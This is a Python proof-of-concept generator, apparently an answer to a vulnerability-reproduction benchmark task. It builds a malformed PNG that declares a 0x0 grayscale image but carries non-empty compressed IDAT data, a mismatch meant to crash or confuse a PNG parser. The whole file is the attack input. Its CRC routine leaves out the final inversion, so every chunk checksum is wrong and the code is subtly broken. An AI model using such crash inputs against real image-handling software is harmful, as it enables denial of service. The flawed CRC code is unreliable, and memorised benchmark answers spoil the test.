import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        def chunk_crc(typ, dat):
            crc = 0xFFFFFFFF
            for byte in typ + dat:
                crc ^= byte
                for _ in range(8):
                    if crc & 1:
                        crc = (crc >> 1) ^ 0xEDB88320
                    else:
                        crc >>= 1
            return struct.pack('>I', crc)

        # PNG signature
        png = b'\x89PNG\r\n\x1a\n'

        # IHDR chunk: 0x0 image, grayscale
        ihdr_data = struct.pack('>IIBBBBB', 0, 0, 8, 0, 0, 0, 0)
        ihdr_len = struct.pack('>I', 13)
        ihdr_typ = b'IHDR'
        ihdr_crc = chunk_crc(ihdr_typ, ihdr_data)

        # IDAT chunk: compressed non-empty data to cause mismatch
        fake_data = b'\x00'
        idat_data = zlib.compress(fake_data)
        idat_len = struct.pack('>I', len(idat_data))
        idat_typ = b'IDAT'
        idat_crc = chunk_crc(idat_typ, idat_data)

        # IEND chunk
        iend_len = struct.pack('>I', 0)
        iend_typ = b'IEND'
        iend_crc = chunk_crc(iend_typ, b'')

        poc = (png +
               ihdr_len + ihdr_typ + ihdr_data + ihdr_crc +
               idat_len + idat_typ + idat_data + idat_crc +
               iend_len + iend_typ + iend_crc)
        return poc